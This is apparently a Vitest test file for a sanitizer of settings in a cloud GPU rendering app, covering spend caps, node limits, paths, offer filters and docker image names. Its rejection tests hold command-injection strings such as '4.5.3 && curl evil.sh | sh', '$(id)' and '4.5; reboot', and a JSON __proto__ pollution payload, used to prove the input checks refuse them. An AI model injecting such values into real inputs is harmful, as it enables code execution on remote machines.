import { describe, expect, it } from 'vitest'
import type { SettingsPublic } from './models'
import {
  BLENDER_VERSION_RE,
  isDockerImage,
  localPathProblem,
  sanitizeSettingsPatch,
  SETTINGS_LIMITS
} from './settingsSanitize'

/** settings.ts's defaults, on a Mac. */
const current: SettingsPublic = {
  hasVastApiKey: true,
  hasOtoyCredentials: false,
  projectRoot: '/Users/you/Documents/vast-renders',
  maxActiveNodes: 2,
  spendCapPerHour: 2,
  idleTimeoutMinutes: 5,
  proxyCodec: 'hevc',
  blenderVersionOverride: null,
  offerFilters: {
    gpuNames: [],
    maxDphTotal: null,
    minGpuRamGb: 10,
    minInetDownMbps: 100,
    minReliability: 0.95,
    minDiskGb: 40
  },
  sshKeyPath: '',
  concurrentTransfersPerNode: 3,
  thumbnails: true,
  livePreview: 'onDemand',
  livePreviewWidth: 960,
  maxNodeSlots: 0,
  slotsPerGpu: 1,
  eagerFleet: false,
  co2OverheadFactor: 1.6
}

const posix = { pathFlavour: 'posix' } as const
const win32 = { pathFlavour: 'win32' } as const

/** Sanitize a patch of anything, as IPC and JSON can send, against `current`. */
function run(
  patch: unknown,
  base: SettingsPublic = current,
  opts: { pathFlavour?: 'posix' | 'win32' } = posix
): ReturnType<typeof sanitizeSettingsPatch> {
  return sanitizeSettingsPatch(patch, base, opts)
}

describe('sanitizeSettingsPatch: the spend cap (#99 #112)', () => {
  it('a blank cap field is not "no cap": the cap is kept and the field says why', () => {
    // Backspacing "2" to type "3" sent spendCapPerHour: null, which every
    // reader takes as uncapped. Left blank, the fleet stayed uncapped.
    for (const blank of [null, '']) {
      const r = run({ spendCapPerHour: blank })
      expect(r.settings.spendCapPerHour).toBe(2)
      expect(r.settings.noSpendCap).toBeUndefined()
      expect(r.errors).toEqual([
        {
          field: 'spendCapPerHour',
          outcome: 'rejected',
          message: expect.stringMatching(/^the spend cap is blank/)
        }
      ])
    }
  })

  it('"no spend cap" turns the cap off, and only it does', () => {
    const r = run({ noSpendCap: true })
    expect(r.errors).toEqual([])
    expect(r.settings.noSpendCap).toBe(true)
    expect(r.settings.spendCapPerHour).toBeNull()
  })

  it('a blank field while the cap is already off agrees with it', () => {
    const off = { ...current, noSpendCap: true, spendCapPerHour: null }
    const r = run({ spendCapPerHour: null }, off)
    expect(r.errors).toEqual([])
    expect(r.settings.spendCapPerHour).toBeNull()
  })

  it('a figure turns the cap back on', () => {
    const off = { ...current, noSpendCap: true, spendCapPerHour: null }
    const r = run({ spendCapPerHour: 3.5 }, off)
    expect(r.errors).toEqual([])
    expect(r.settings).toMatchObject({ spendCapPerHour: 3.5, noSpendCap: false })
  })

  it('turning "no spend cap" off needs a figure to cap at', () => {
    const off = { ...current, noSpendCap: true, spendCapPerHour: null }
    const alone = run({ noSpendCap: false }, off)
    expect(alone.settings).toMatchObject({ spendCapPerHour: null, noSpendCap: true })
    expect(alone.errors).toEqual([
      {
        field: 'noSpendCap',
        outcome: 'rejected',
        message: expect.stringMatching(/enter a spend cap/)
      }
    ])
    const withBlank = run({ noSpendCap: false, spendCapPerHour: null }, off)
    expect(withBlank.settings).toMatchObject({ spendCapPerHour: null, noSpendCap: true })
    expect(withBlank.errors).toHaveLength(1)
    const withFigure = run({ noSpendCap: false, spendCapPerHour: 4 }, off)
    expect(withFigure.errors).toEqual([])
    expect(withFigure.settings).toMatchObject({ spendCapPerHour: 4, noSpendCap: false })
    // A cap already there stays on.
    expect(run({ noSpendCap: false }).settings).toMatchObject({
      spendCapPerHour: 2,
      noSpendCap: false
    })
  })

  it('"no cap" together with a figure keeps what is there', () => {
    const r = run({ noSpendCap: true, spendCapPerHour: 3 })
    expect(r.settings.spendCapPerHour).toBe(2)
    expect(r.settings.noSpendCap).toBeUndefined()
    expect(r.errors.map((e) => e.field).sort()).toEqual(['noSpendCap', 'spendCapPerHour'])
  })

  it('clamps a cap outside its limits, and refuses one that is not a number', () => {
    expect(run({ spendCapPerHour: -1 }).settings.spendCapPerHour).toBe(0)
    expect(run({ spendCapPerHour: 5000 }).settings.spendCapPerHour).toBe(
      SETTINGS_LIMITS.spendCapPerHour.max
    )
    expect(run({ spendCapPerHour: 5000 }).errors[0].outcome).toBe('clamped')
    for (const bad of [NaN, Infinity, '3', true, {}]) {
      const r = run({ spendCapPerHour: bad })
      expect(r.settings.spendCapPerHour, String(bad)).toBe(2)
      expect(r.errors[0]).toMatchObject({ field: 'spendCapPerHour', outcome: 'rejected' })
    }
    expect(run({ noSpendCap: 'yes' }).errors[0]).toMatchObject({
      field: 'noSpendCap',
      outcome: 'rejected'
    })
  })

  it('leaves both alone when the patch touches neither, even a file from before the flag', () => {
    const legacy = { ...current, spendCapPerHour: null }
    const r = run({ thumbnails: false }, legacy)
    expect(r.errors).toEqual([])
    expect(r.settings.spendCapPerHour).toBeNull()
    expect(r.settings.noSpendCap).toBeUndefined()
  })
})

describe('sanitizeSettingsPatch: numbers', () => {
  it('"1e3" in max active nodes saves the ceiling, not 1000 nodes (#99)', () => {
    const r = run({ maxActiveNodes: 1e3 })
    expect(r.settings.maxActiveNodes).toBe(64)
    expect(r.errors).toEqual([
      {
        field: 'maxActiveNodes',
        outcome: 'clamped',
        message: 'max active nodes can be at most 64, so 64 was saved (got 1000)'
      }
    ])
    expect(run({ maxActiveNodes: -1 }).settings.maxActiveNodes).toBe(0)
    expect(run({ maxActiveNodes: 30 }).errors).toEqual([])
  })

  it('an emptied idle timeout no longer destroys nodes the moment they go idle (#99)', () => {
    // Number('') is 0.
    const r = run({ idleTimeoutMinutes: 0 })
    expect(r.settings.idleTimeoutMinutes).toBe(1)
    expect(r.errors[0].outcome).toBe('clamped')
  })

  it('refuses fractions where only whole numbers make sense', () => {
    for (const [field, value] of [
      ['maxActiveNodes', 2.5],
      ['concurrentTransfersPerNode', 1.5],
      ['maxNodeSlots', 0.5],
      ['slotsPerGpu', 1.5]
    ] as const) {
      const r = run({ [field]: value })
      expect(r.settings[field], field).toBe(current[field])
      expect(r.errors[0], field).toMatchObject({ field, outcome: 'rejected' })
    }
  })

  it('keeps the live preview width even, as the node encoder needs', () => {
    expect(run({ livePreviewWidth: 961 }).settings.livePreviewWidth).toBe(960)
    expect(run({ livePreviewWidth: 961 }).errors[0].outcome).toBe('clamped')
    expect(run({ livePreviewWidth: 100 }).settings.livePreviewWidth).toBe(256)
    expect(run({ livePreviewWidth: 1280 }).errors).toEqual([])
  })

  it('clamps the rest into their ranges', () => {
    const r = run({ co2OverheadFactor: 0, slotsPerGpu: 7, concurrentTransfersPerNode: 0 })
    expect(r.settings).toMatchObject({
      co2OverheadFactor: 1,
      slotsPerGpu: 2,
      concurrentTransfersPerNode: 1
    })
    expect(r.errors.map((e) => e.outcome)).toEqual(['clamped', 'clamped', 'clamped'])
  })
})

describe('sanitizeSettingsPatch: the Blender version override (#159)', () => {
  it('takes a series or a release, trimmed, and blank means auto', () => {
    expect(run({ blenderVersionOverride: '4.5' }).settings.blenderVersionOverride).toBe('4.5')
    expect(run({ blenderVersionOverride: ' 4.5.3 ' }).settings.blenderVersionOverride).toBe('4.5.3')
    expect(run({ blenderVersionOverride: '' }).settings.blenderVersionOverride).toBeNull()
    const set = { ...current, blenderVersionOverride: '4.2.1' }
    expect(run({ blenderVersionOverride: null }, set).settings.blenderVersionOverride).toBeNull()
  })

  it('refuses anything that could be a second command on the node', () => {
    // It goes unquoted into `provision.sh install-blender <version>`.
    for (const bad of [
      '4.5; reboot',
      '4.5.3 && curl evil.sh | sh',
      '$(id)',
      '`id`',
      '4.5\nreboot',
      '4.5 4.4',
      'latest',
      '4',
      '4.5.3.1',
      42
    ]) {
      const r = run({ blenderVersionOverride: bad })
      expect(r.settings.blenderVersionOverride, String(bad)).toBeNull()
      expect(r.errors[0], String(bad)).toMatchObject({
        field: 'blenderVersionOverride',
        outcome: 'rejected'
      })
    }
  })

  it('BLENDER_VERSION_RE is digits and dots only', () => {
    expect(BLENDER_VERSION_RE.test('10.12.123')).toBe(true)
    expect(BLENDER_VERSION_RE.test('4.5.3 ')).toBe(false)
  })
})

describe('sanitizeSettingsPatch: paths', () => {
  it('the project root must be an absolute path on this computer', () => {
    expect(run({ projectRoot: '/Volumes/Work/renders' }).errors).toEqual([])
    expect(run({ projectRoot: 'D:\\Renders' }, current, win32).errors).toEqual([])
    expect(run({ projectRoot: 'D:/Renders' }, current, win32).errors).toEqual([])
    for (const [bad, opts] of [
      ['renders', posix],
      ['~/renders', posix],
      ['', posix],
      ['/a/../b', posix],
      ['/a/./b', posix],
      ['/renders ', posix],
      ['/ren\u0000ders', posix],
      ['//server/share/renders', posix],
      ['C:\\Renders', posix], // a relative file name on macOS
      ['\\\\server\\share\\renders', win32],
      ['\\\\?\\C:\\Renders', win32],
      ['/renders', win32], // relative to whichever drive is current
      ['C:Renders', win32],
      ['C:\\a\\..\\b', win32],
      ['C:\\Renders:stream', win32],
      [42, posix]
    ] as const) {
      const r = run({ projectRoot: bad }, current, opts)
      expect(r.settings.projectRoot, String(bad)).toBe(current.projectRoot)
      expect(r.errors[0], String(bad)).toMatchObject({ field: 'projectRoot', outcome: 'rejected' })
    }
  })

  it('without a flavour, either form is taken (a renderer hint only)', () => {
    expect(localPathProblem('/Users/you/Renders')).toBeNull()
    expect(localPathProblem('C:\\Renders')).toBeNull()
    expect(localPathProblem('Renders')).toMatch(/such as \/Users\/you\/Renders or C:\\Renders/)
  })

  it('the SSH key path may be blank (the app’s own key) or a local path', () => {
    const custom = { ...current, sshKeyPath: '/Users/you/.ssh/id_vast' }
    expect(run({ sshKeyPath: '' }, custom).settings.sshKeyPath).toBe('')
    expect(run({ sshKeyPath: '/Users/you/.ssh/id_ed25519' }).errors).toEqual([])
    expect(run({ sshKeyPath: 'id_ed25519' }).errors[0]).toMatchObject({
      field: 'sshKeyPath',
      outcome: 'rejected'
    })
  })
})

describe('sanitizeSettingsPatch: offer filters', () => {
  it('merges the filters a patch names and keeps the rest', () => {
    const r = run({ offerFilters: { minDiskGb: 80, cpuBound: true } })
    expect(r.errors).toEqual([])
    expect(r.settings.offerFilters).toEqual({
      ...current.offerFilters,
      minDiskGb: 80,
      cpuBound: true
    })
  })

  it('clamps and refuses per filter, naming each one', () => {
    const r = run({
      offerFilters: { minReliability: 2, minDiskGb: 5, minGpuRamGb: 'lots', surprise: 1 }
    })
    expect(r.settings.offerFilters).toMatchObject({
      minReliability: 1,
      minDiskGb: 10,
      minGpuRamGb: 10
    })
    expect(r.errors.map((e) => [e.field, e.outcome])).toEqual([
      ['offerFilters.minReliability', 'clamped'],
      ['offerFilters.minDiskGb', 'clamped'],
      ['offerFilters.minGpuRamGb', 'rejected'],
      ['offerFilters.surprise', 'rejected']
    ])
  })

  it('a blank max price means any price; the optional floors go back to none', () => {
    const set = {
      ...current,
      offerFilters: { ...current.offerFilters, maxDphTotal: 1, minNumGpus: 4 }
    }
    const r = run({ offerFilters: { maxDphTotal: null, minNumGpus: null, minCpuCores: '' } }, set)
    expect(r.errors).toEqual([])
    expect(r.settings.offerFilters).toMatchObject({
      maxDphTotal: null,
      minNumGpus: null,
      minCpuCores: null
    })
    expect(run({ offerFilters: { minNumGpus: 32 } }).settings.offerFilters.minNumGpus).toBe(16)
  })

  it('tidies the GPU allowlist and refuses one that is not a list of names', () => {
    const r = run({ offerFilters: { gpuNames: [' RTX 4090 ', '', 'A100 SXM4', 'RTX 4090'] } })
    expect(r.errors).toEqual([])
    expect(r.settings.offerFilters.gpuNames).toEqual(['RTX 4090', 'A100 SXM4'])
    for (const bad of ['RTX 4090', [42], ['RTX\n4090']]) {
      const rejected = run({ offerFilters: { gpuNames: bad } })
      expect(rejected.settings.offerFilters.gpuNames).toEqual([])
      expect(rejected.errors[0].field).toBe('offerFilters.gpuNames')
    }
  })

  it('refuses filters that are not an object', () => {
    for (const bad of [null, [], 'cheap']) {
      const r = run({ offerFilters: bad })
      expect(r.settings.offerFilters).toEqual(current.offerFilters)
      expect(r.errors[0]).toMatchObject({ field: 'offerFilters', outcome: 'rejected' })
    }
  })
})

describe('sanitizeSettingsPatch: Octane and docker images (plan 1.18)', () => {
  it('Octane options default off and merge', () => {
    const r = run({ octane: { scriptedSignIn: true } })
    expect(r.errors).toEqual([])
    expect(r.settings.octane).toEqual({ scriptedSignIn: true, secureCloudOnly: false })
    const both = run({ octane: { secureCloudOnly: true } }, r.settings)
    expect(both.settings.octane).toEqual({ scriptedSignIn: true, secureCloudOnly: true })
    const bad = run({ octane: { scriptedSignIn: 'yes', sneaky: true } })
    expect(bad.settings.octane).toEqual({ scriptedSignIn: false, secureCloudOnly: false })
    expect(bad.errors.map((e) => e.field)).toEqual(['octane.scriptedSignIn', 'octane.sneaky'])
  })

  it('takes a well-formed image per engine; blank goes back to the built-in one', () => {
    const r = run({ dockerImageByEngine: { octane: ' otoy/octane-blender:2024.1 ' } })
    expect(r.errors).toEqual([])
    expect(r.settings.dockerImageByEngine).toEqual({ octane: 'otoy/octane-blender:2024.1' })
    const cleared = run({ dockerImageByEngine: { octane: null } }, r.settings)
    expect(cleared.settings.dockerImageByEngine).toEqual({})
  })

  it('refuses an image that is not an image name, and an engine that does not exist', () => {
    const r = run({
      dockerImageByEngine: { cycles: 'img; curl evil.sh | sh', octane: 'Otoy/Octane', unreal: 'x' }
    })
    expect(r.settings.dockerImageByEngine).toEqual({})
    expect(r.errors.map((e) => e.field)).toEqual([
      'dockerImageByEngine.cycles',
      'dockerImageByEngine.octane',
      'dockerImageByEngine.unreal'
    ])
  })

  it('isDockerImage follows the reference grammar', () => {
    for (const ok of [
      'vastai/base-image:cuda-12.1.1-cudnn8-devel-ubuntu22.04',
      'ubuntu',
      'ghcr.io/org/team/image:v1.2',
      'localhost:5000/render_node',
      `img@sha256:${'a'.repeat(64)}`
    ]) {
      expect(isDockerImage(ok), ok).toBe(true)
    }
    for (const bad of [
      '',
      'UPPER',
      'img:',
      'img:tag with space',
      '-img',
      'a//b',
      '../img',
      `x${'y'.repeat(300)}`
    ]) {
      expect(isDockerImage(bad), bad).toBe(false)
    }
  })
})

describe('sanitizeSettingsPatch: the patch itself', () => {
  it('refuses unknown settings instead of saving them (#8)', () => {
    const r = run({ nodeSlots: 4, maxActiveNodes: 3 })
    expect(r.settings.maxActiveNodes).toBe(3)
    expect('nodeSlots' in r.settings).toBe(false)
    expect(r.errors).toEqual([
      { field: 'nodeSlots', outcome: 'rejected', message: 'unknown setting "nodeSlots"' }
    ])
  })

  it('cannot reach the prototype through a JSON __proto__ key', () => {
    const r = run(
      JSON.parse('{"__proto__": {"polluted": true}, "offerFilters": {"__proto__": {"x": 1}}}')
    )
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
    expect(Object.getPrototypeOf(r.settings)).toBe(Object.prototype)
    expect(Object.getPrototypeOf(r.settings.offerFilters)).toBe(Object.prototype)
    expect(r.errors.map((e) => e.field)).toEqual(['__proto__', 'offerFilters.__proto__'])
  })

  it("drops main's own fields without a word, as settings.ts always has", () => {
    const r = run({ hasVastApiKey: false, hasOtoyCredentials: true, installId: 'forged' })
    expect(r.errors).toEqual([])
    expect(r.settings.hasVastApiKey).toBe(true)
    expect(r.settings.hasOtoyCredentials).toBe(false)
    expect(r.settings.installId).toBeUndefined()
    const withId = { ...current, installId: 'a1b2c3d4-0000' }
    expect(run({ installId: 'forged' }, withId).settings.installId).toBe('a1b2c3d4-0000')
  })

  it('saves what passes even when a neighbour fails', () => {
    const r = run({ blenderVersionOverride: '4.5; reboot', spendCapPerHour: 3, thumbnails: false })
    expect(r.settings).toMatchObject({
      blenderVersionOverride: null,
      spendCapPerHour: 3,
      thumbnails: false
    })
    expect(r.errors.map((e) => e.field)).toEqual(['blenderVersionOverride'])
  })

  it('treats undefined as absent, and refuses a patch that is not an object', () => {
    expect(run({ spendCapPerHour: undefined, maxActiveNodes: undefined })).toEqual({
      settings: current,
      errors: []
    })
    for (const bad of [null, 'x', 3, [1]]) {
      const r = run(bad)
      expect(r.settings).toEqual(current)
      expect(r.errors).toHaveLength(1)
    }
  })

  it('checks enums and booleans', () => {
    const r = run({
      proxyCodec: 'h264',
      livePreview: 'sometimes',
      thumbnails: 1,
      eagerFleet: 'true'
    })
    expect(r.settings).toMatchObject({
      proxyCodec: 'hevc',
      livePreview: 'onDemand',
      thumbnails: true,
      eagerFleet: false
    })
    expect(r.errors.map((e) => e.field)).toEqual([
      'proxyCodec',
      'livePreview',
      'thumbnails',
      'eagerFleet'
    ])
    expect(run({ proxyCodec: 'av1', livePreview: 'always', eagerFleet: true }).errors).toEqual([])
  })

  it('does not modify current', () => {
    const before = structuredClone(current)
    run({
      maxActiveNodes: 9,
      offerFilters: { minDiskGb: 99, gpuNames: ['RTX 4090'] },
      octane: { scriptedSignIn: true },
      dockerImageByEngine: { octane: 'otoy/octane' },
      noSpendCap: true
    })
    expect(current).toEqual(before)
  })

  it('every default passes its own rules', () => {
    // Sanitizing the settings as a patch over themselves changes nothing:
    // a loader may run a file through this without losing a valid value.
    const full: SettingsPublic = {
      ...current,
      noSpendCap: false,
      octane: { scriptedSignIn: false, secureCloudOnly: false },
      dockerImageByEngine: { octane: 'otoy/octane:latest' }
    }
    expect(run(full, full)).toEqual({ settings: full, errors: [] })
  })
})
